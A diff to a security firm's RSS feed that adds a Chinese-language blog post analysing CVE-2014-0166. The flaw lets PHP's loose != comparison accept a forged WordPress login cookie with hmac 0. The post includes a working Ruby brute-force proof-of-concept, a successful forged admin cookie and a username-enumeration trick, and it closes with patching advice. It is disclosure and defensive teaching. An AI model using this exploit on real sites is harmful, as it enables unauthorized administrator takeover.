@@ -4,11 +4,105 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試、資安事件處理、教育訓練、資安顧問服務</description>
         <link>http://devco.re</link>
-        <lastBuildDate>Mon, 14 Apr 2014 13:29:17 +0800</lastBuildDate>
-        <pubDate>Mon, 14 Apr 2014 13:29:17 +0800</pubDate>
+        <lastBuildDate>Thu, 17 Apr 2014 00:09:03 +0800</lastBuildDate>
+        <pubDate>Thu, 17 Apr 2014 00:09:03 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="http://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
+                <description>&lt;h3 id=&quot;&quot;&gt;前言&lt;/h3&gt;
+
+&lt;p&gt;在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。 讓我們來分析一下這次的弱點是發生了什麼事吧！&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;h3 id=&quot;_2&quot;&gt;解析&lt;/h3&gt;
+
+&lt;p&gt;這次出問題的程式碼在&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;這邊&lt;/a&gt;，關鍵程式碼如下：&lt;/p&gt;
+&lt;div class=&#39;highlight&#39;&gt;&lt;pre&gt;&lt;code class=&#39;php&#39;&gt;&lt;span class=&#39;nv&#39;&gt;$key&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;nx&#39;&gt;wp_hash&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;nv&#39;&gt;$username&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;.&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$pass_frag&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;.&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;.&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$expiration&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$scheme&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt;
+&lt;span class=&#39;nv&#39;&gt;$hash&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;hash_hmac&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s1&#39;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$username&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;.&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;.&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$expiration&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$key&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;(&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$hmac&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$hash&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;{&lt;/span&gt;
+  &lt;span class=&#39;sd&#39;&gt;/**&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   * Fires if a bad authentication cookie hash is encountered.&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   *&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   * @since 2.7.0&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   *&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   * @param array $cookie_elements An array of data for the authentication cookie.&lt;/span&gt;
+&lt;span class=&#39;sd&#39;&gt;   */&lt;/span&gt;
+  &lt;span class=&#39;nx&#39;&gt;do_action&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;);&lt;/span&gt;
+  &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;false&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;;&lt;/span&gt;
+&lt;span class=&#39;p&#39;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;官方手冊&lt;/a&gt;。&lt;/p&gt;
+&lt;div class=&#39;highlight&#39;&gt;&lt;pre&gt;&lt;code class=&#39;php&#39;&gt;&lt;span class=&#39;nb&#39;&gt;var_dump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt; &lt;span class=&#39;c1&#39;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
+&lt;span class=&#39;nb&#39;&gt;var_dump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;01&amp;quot;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt; &lt;span class=&#39;c1&#39;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
+&lt;span class=&#39;nb&#39;&gt;var_dump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;&amp;quot;10&amp;quot;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;1e1&amp;quot;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt; &lt;span class=&#39;c1&#39;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
+&lt;span class=&#39;nb&#39;&gt;var_dump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;100&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;1e2&amp;quot;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;);&lt;/span&gt; &lt;span class=&#39;c1&#39;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
+&lt;span class=&#39;nb&#39;&gt;var_dump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;);&lt;/span&gt; &lt;span class=&#39;c1&#39;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。&lt;br /&gt; username 是使用者名稱，&lt;br /&gt; expiration 是有效期限(timestamp)，&lt;br /&gt; hmac 值用來驗證 cookie 是否合法。&lt;br /&gt; 從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。&lt;/p&gt;
+
+&lt;p&gt;利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：&lt;/p&gt;
+&lt;div class=&#39;highlight&#39;&gt;&lt;pre&gt;&lt;code class=&#39;php&#39;&gt;&lt;span class=&#39;c1&#39;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
+  &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;(&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;!=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;{&lt;/span&gt;
+    &lt;span class=&#39;nx&#39;&gt;do_action&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nv&#39;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;);&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;false&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;;&lt;/span&gt;
+  &lt;span class=&#39;p&#39;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;如此便可以通過驗證，成功偽造合法 cookie。&lt;br /&gt; 而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。&lt;br /&gt; 符合 $hash == 0 的 MD5 $hash 值有 0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;
+
+&lt;p&gt;故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;
+
+&lt;p&gt;每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。&lt;/p&gt;
+
+&lt;h3 id=&quot;_3&quot;&gt;實驗&lt;/h3&gt;
+
+&lt;p&gt;為了驗證此方法之可行性，我們架設了 &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：&lt;/p&gt;
+&lt;div class=&#39;highlight&#39;&gt;&lt;pre&gt;&lt;code class=&#39;ruby&#39;&gt;&lt;span class=&#39;nb&#39;&gt;require&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;httpclient&amp;#39;&lt;/span&gt;
+
+&lt;span class=&#39;n&#39;&gt;http&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;no&#39;&gt;HTTPClient&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;new&lt;/span&gt;
+
+&lt;span class=&#39;n&#39;&gt;cookie_name&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&amp;quot;&lt;/span&gt;
+&lt;span class=&#39;n&#39;&gt;timestamp&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;no&#39;&gt;Time&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;now&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;to_i&lt;/span&gt;
+
+&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;timestamp&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;.timestamp&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;+&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;800000000&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;each&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;do&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;|&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;|&lt;/span&gt;
+  &lt;span class=&#39;n&#39;&gt;result&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;http&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;get&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s1&#39;&gt;&amp;#39;http://domain.my/WordPress/&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;kp&#39;&gt;nil&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;{&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;#{&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;cookie_name&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;}&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;=admin%7C&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;#{&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;}&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;%7C0&amp;quot;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;})&lt;/span&gt;
+  &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;result&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;body&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;include?&lt;/span&gt; &lt;span class=&#39;s1&#39;&gt;&amp;#39;logout&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;nb&#39;&gt;puts&lt;/span&gt; &lt;span class=&#39;s2&#39;&gt;&amp;quot;admin%7C&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;#{&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;}&lt;/span&gt;&lt;span class=&#39;s2&#39;&gt;%7C0&amp;quot;&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;break&lt;/span&gt;
+  &lt;span class=&#39;k&#39;&gt;end&lt;/span&gt;
+&lt;span class=&#39;k&#39;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+&lt;p&gt;註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;經過一段長時間的等待，得到的結果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;_4&quot;&gt;結論&lt;/h3&gt;
+
+&lt;p&gt;最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。&lt;/p&gt;
+
+&lt;p&gt;對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。&lt;/p&gt;
+
+&lt;p&gt;對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。&lt;/p&gt;
+
+&lt;p&gt;從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。&lt;/p&gt;</description>
+                <link>http://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
+                <guid>http://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
+                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
